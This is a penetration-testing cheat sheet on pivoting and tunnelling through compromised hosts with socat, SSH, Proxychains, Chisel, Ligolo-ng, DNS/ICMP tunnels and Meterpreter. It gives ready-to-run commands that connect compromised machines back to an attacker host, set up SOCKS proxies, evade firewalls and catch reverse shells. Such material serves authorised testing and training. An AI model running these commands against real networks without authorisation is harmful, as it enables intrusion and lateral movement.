---
sidebar_position: 1
title: Pivoting & Tunneling
---

# Pivoting & Tunneling

Pivoting uses a compromised host as a relay to access internal networks that aren't directly reachable from your attacking machine. Tunneling encapsulates traffic through an allowed protocol to bypass firewall restrictions.

```bash
# Set environment variables
export TARGET=<ip>
export USER=<username>
export PASSWORD=<password>
export LHOST=<your-ip>
export LPORT=4444
```

---

## Socat

Simple port forwarding through a compromised host. Listens on one port and relays traffic to another host/port.

Forward traffic from the pivot host to an internal target:

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

- `-ddd` — verbose output
- `fork` — handle multiple connections (doesn't die after one)
- Listens on port 2345 on the pivot host, forwards to 10.4.50.215:5432

Forward traffic and bind to all interfaces:

```bash
socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.1.10:80
```

:::tip
Socat is often not installed by default. You may need to transfer a static binary or use an alternative method. A precompiled static socat binary for Linux can be found in the SecLists repository.
:::

---

## SSH Tunneling

SSH tunnels are the most reliable pivoting method when you have SSH access to the pivot host.

### Local Port Forward

Forward a local port on your Kali machine to a service behind the pivot host:

```bash
ssh -N -L 0.0.0.0:<local-port>:<internal-target>:<target-port> $USER@<pivot-host>
```

Example — access an internal web server (172.16.1.10:80) through a pivot host:

```bash
ssh -N -L 0.0.0.0:8080:172.16.1.10:80 $USER@<pivot-host>
# Now browse to http://127.0.0.1:8080 on Kali
```

Example — access an internal MSSQL server:

```bash
ssh -N -L 0.0.0.0:1433:172.16.1.20:1433 $USER@<pivot-host>
impacket-mssqlclient $USER:$PASSWORD@127.0.0.1
```

### Remote Port Forward

Make a service on your Kali machine accessible from the internal network. Useful when the pivot host can reach internal targets but Kali can't initiate connections inward.

From the pivot host, connect back to Kali and expose Kali's port 4444 on the pivot host:

```bash
ssh -N -R 0.0.0.0:9999:127.0.0.1:4444 kali@$LHOST
```

Now internal machines can connect to `<pivot-host>:9999` which tunnels to `Kali:4444`.

:::warning
Remote port forwarding to `0.0.0.0` requires `GatewayPorts yes` in the SSH server's `sshd_config`. If this isn't set, the forwarded port only binds to `127.0.0.1` on the pivot host.
:::

### Dynamic Port Forward (SOCKS Proxy)

Create a SOCKS proxy through the pivot host — this lets you route arbitrary traffic to any host/port on the internal network:

```bash
ssh -N -D 0.0.0.0:9999 $USER@<pivot-host>
```

- `-D` creates a SOCKS proxy on port 9999
- `-N` prevents a shell from being spawned

Now configure your tools to use the SOCKS proxy (see Proxychains below).

### SSH Through Multiple Hops

Chain SSH connections through multiple pivot hosts:

```bash
ssh -J $USER@pivot1,$USER@pivot2 $USER@final-target
```

Or use ProxyJump in `~/.ssh/config`:

```
Host final-target
    HostName 10.10.10.50
    User admin
    ProxyJump pivot1,pivot2

Host pivot1
    HostName 192.168.1.10
    User user1

Host pivot2
    HostName 172.16.1.5
    User user2
```

---

## Proxychains

Forces network traffic from third-party tools through a SOCKS proxy. Uses `LD_PRELOAD` to hook libc networking functions.

:::warning
Proxychains works for most dynamically-linked binaries but will NOT work on statically-linked binaries (e.g., some Go binaries like nmap's compiled alternatives).
:::

### Configuration

Edit `/etc/proxychains4.conf`, replace the proxy definition at the bottom:

```
[ProxyList]
socks5 127.0.0.1 9999
```

Can be `socks4` or `socks5` — SSH supports both. SOCKS5 adds authentication, IPv6, and UDP/DNS support.

For chaining through multiple proxies (double pivot), list them in order:

```
[ProxyList]
socks5 127.0.0.1 9999
socks5 127.0.0.1 8888
```

### Speed Optimization

Default timeouts make port scanning extremely slow. Lower them in the config:

```
tcp_read_time_out 800
tcp_connect_time_out 800
```

### Usage

Prepend `proxychains` to any command:

```bash
proxychains nmap -sT -Pn -p 21,22,80,445,3389 172.16.1.10
proxychains smbclient -L //172.16.1.10/ -U $USER --password=$PASSWORD
proxychains nxc smb 172.16.1.0/24 -u $USER -p $PASSWORD --shares
proxychains evil-winrm -i 172.16.1.10 -u $USER -p $PASSWORD
proxychains xfreerdp /u:$USER /p:$PASSWORD /v:172.16.1.10 /cert-ignore
```

:::tip
When scanning through Proxychains, use `-sT` (full TCP connect) with Nmap instead of the default SYN scan. SYN scans require raw sockets which don't go through the SOCKS proxy. Also skip host discovery with `-Pn` since ICMP doesn't traverse SOCKS.
:::

---

## Chisel

HTTP-based tunneling tool — works when SSH is not available. Chisel creates a tunnel over HTTP/HTTPS, which is less likely to be blocked by firewalls.

### Setup

Download Chisel for both your platform and the target architecture: https://github.com/jpillora/chisel/releases

### Reverse SOCKS Proxy (Most Common)

Start the Chisel server on Kali:

```bash
chisel server --reverse --port 8080
```

On the compromised pivot host, connect back:

```bash
./chisel client $LHOST:8080 R:socks
```

This creates a SOCKS5 proxy on Kali at `127.0.0.1:1080`. Configure Proxychains:

```
[ProxyList]
socks5 127.0.0.1 1080
```

Now use Proxychains to route tools through the pivot host to the internal network.

### Forward Port Through Chisel

Forward a specific internal port to Kali:

On Kali:

```bash
chisel server --reverse --port 8080
```

On the pivot host:

```bash
./chisel client $LHOST:8080 R:3306:172.16.1.10:3306
```

This forwards `Kali:3306` → `172.16.1.10:3306` through the pivot.

### Chisel as Forward Proxy

If the pivot host can reach Kali directly (less common):

On the pivot host:

```bash
./chisel server --port 8080 --socks5
```

On Kali:

```bash
chisel client <pivot-host>:8080 socks
```

### Chisel with Authentication

Secure the tunnel with a shared secret:

```bash
# Server
chisel server --reverse --port 8080 --auth user:password

# Client
./chisel client --auth user:password $LHOST:8080 R:socks
```

:::tip
Chisel can also tunnel over HTTPS by placing it behind a reverse proxy, making the traffic look like normal web browsing.
:::

---

## Ligolo-ng

Modern tunneling framework that creates a full network tunnel (not just SOCKS). With Ligolo-ng, tools behave as if they're directly connected to the internal network — no Proxychains required.

### Setup (Kali — Proxy)

Create a TUN interface:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

Start the Ligolo proxy:

```bash
./proxy -selfcert -laddr 0.0.0.0:11601
```

### Setup (Target — Agent)

Transfer the agent binary to the compromised host and connect back:

Linux:

```bash
./agent -connect $LHOST:11601 -ignore-cert
```

Windows:

```powershell
.\agent.exe -connect $LHOST:11601 -ignore-cert
```

### Start the Tunnel

In the Ligolo proxy interface, select the session and start the tunnel:

```
>> session
>> 1
>> start
```

Add a route to the internal network on Kali:

```bash
sudo ip route add 172.16.1.0/24 dev ligolo
```

Now you can access the internal network directly from Kali — no Proxychains needed:

```bash
nmap -sCV -p- 172.16.1.10
evil-winrm -i 172.16.1.10 -u $USER -p $PASSWORD
smbclient -L //172.16.1.10/ -U $USER
```

### Port Forwarding with Ligolo-ng

Forward a port from the internal network to Kali:

In the Ligolo interface:

```
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

This listens on the pivot host's port 4444 and forwards to Kali's port 4444 — useful for catching reverse shells from internal machines.

### Double Pivot with Ligolo-ng

To reach a third network through a second pivot:

1. From the first pivot, start a Ligolo agent connecting to Kali
2. Add routes for the second network
3. Transfer the agent to the second pivot through the first tunnel
4. On the second pivot, run the agent connecting back to Kali through the first tunnel
5. In the Ligolo interface, add another tunnel and routes for the third network

:::tip
Ligolo-ng is significantly faster and easier to use than Proxychains + SSH dynamic forwarding for most operations. The only downside is transferring the agent binary to the target.
:::

---

## sshuttle

Creates a transparent VPN-like tunnel over SSH. Routes traffic through the pivot host without configuring SOCKS proxies or Proxychains.

```bash
sshuttle -r $USER@<pivot-host> 172.16.1.0/24
```

With a private key:

```bash
sshuttle -r $USER@<pivot-host> 172.16.1.0/24 --ssh-cmd "ssh -i /path/to/key"
```

Route multiple subnets:

```bash
sshuttle -r $USER@<pivot-host> 172.16.1.0/24 10.10.10.0/24
```

sshuttle uses `iptables` on Kali to transparently redirect traffic, so tools work normally without any proxy configuration.

:::warning
sshuttle only tunnels TCP traffic. UDP and ICMP are not supported. DNS can be tunneled with the `--dns` flag.
:::

---

## Windows Port Forwarding (netsh)

When the compromised host is Windows, use the built-in `netsh` port proxy for simple forwarding.

Forward a port on the compromised Windows host to an internal target:

```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=7070 connectaddress=172.16.1.10 connectport=3306
```

Verify the forward:

```powershell
netsh interface portproxy show all
```

Open the firewall for the listening port (if needed):

```powershell
netsh advfirewall firewall add rule name="pivot" protocol=TCP dir=in localport=7070 action=allow
```

Remove the forward when done:

```powershell
netsh interface portproxy delete v4tov4 listenport=7070
```

---

## plink.exe (Windows SSH Client)

PuTTY's command-line SSH client. Useful when the pivot host is Windows and OpenSSH is not available.

Remote port forward (expose an internal service through Kali):

```powershell
plink.exe -ssh -l kali -pw <kali-password> -R 0.0.0.0:9999:172.16.1.10:445 $LHOST
```

Dynamic SOCKS proxy:

```powershell
plink.exe -ssh -l kali -pw <kali-password> -D 1080 $LHOST
```

:::tip
Ensure Kali's SSH config has `PermitRootLogin yes` if connecting as root, and restart the SSH service: `sudo systemctl restart ssh`.
:::

---

## DNS Tunneling

Tunnel traffic through DNS queries when only DNS (port 53) is allowed outbound.

### dnscat2

On Kali (start DNS server):

```bash
dnscat2-server <your-domain>
```

On the target:

```bash
./dnscat --dns server=$LHOST
```

From the dnscat2 shell, set up a port forward:

```
listen 127.0.0.1:9999 172.16.1.10:445
```

### iodine

Creates a full network tunnel over DNS. Faster than dnscat2 for bulk data transfer.

On Kali:

```bash
sudo iodined -f -c -P password 10.0.0.1 <your-domain>
```

On the target:

```bash
sudo iodine -f -P password <your-domain> -r
```

This creates a `dns0` interface on both ends with IP addresses in the 10.0.0.0/24 range.

---

## ICMP Tunneling

### ptunnel-ng

Tunnel TCP traffic through ICMP echo requests.

On Kali (server):

```bash
sudo ptunnel-ng -r$LHOST -R22
```

On the target (client):

```bash
sudo ptunnel-ng -p$LHOST -l2222 -r$LHOST -R22
```

Connect through the tunnel:

```bash
ssh -p 2222 -l kali 127.0.0.1
```

---

## Meterpreter Pivoting

If you have a Meterpreter session, use built-in pivoting features.

### autoroute

Add a route to the internal network through the Meterpreter session:

```
run autoroute -s 172.16.1.0/24
```

Verify:

```
run autoroute -p
```

### portfwd

Forward a local port through the Meterpreter session:

```
portfwd add -l 3389 -p 3389 -r 172.16.1.10
```

Now connect to `localhost:3389` on Kali to reach the internal RDP service.

### SOCKS Proxy

Create a SOCKS proxy through the Meterpreter session:

```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

Configure Proxychains to use `socks5 127.0.0.1 1080`.

---

## Double Pivoting

When you need to reach a third network that's only accessible from a second compromised host.

### Scenario

```
Kali (192.168.1.x) → Pivot1 (192.168.1.x / 172.16.1.x) → Pivot2 (172.16.1.x / 10.10.10.x) → Target (10.10.10.x)
```

### SSH Double Pivot

Create a SOCKS proxy through the first pivot:

```bash
ssh -N -D 9999 $USER@pivot1
```

Use Proxychains to SSH through the first pivot to the second pivot, creating another SOCKS proxy:

```bash
proxychains ssh -N -D 8888 $USER@pivot2
```

Add both proxies to Proxychains config:

```
[ProxyList]
socks5 127.0.0.1 9999
socks5 127.0.0.1 8888
```

### Chisel Double Pivot

On Kali:

```bash
chisel server --reverse --port 8080
```

On Pivot1:

```bash
./chisel client $LHOST:8080 R:socks
./chisel server --port 9090 --socks5
```

On Pivot2:

```bash
./chisel client pivot1:9090 R:1081:socks
```

:::tip
Double pivoting adds significant latency. Reduce Nmap scan intensity and increase timeouts when scanning through multiple hops. Consider only scanning specific ports rather than full port scans.
:::
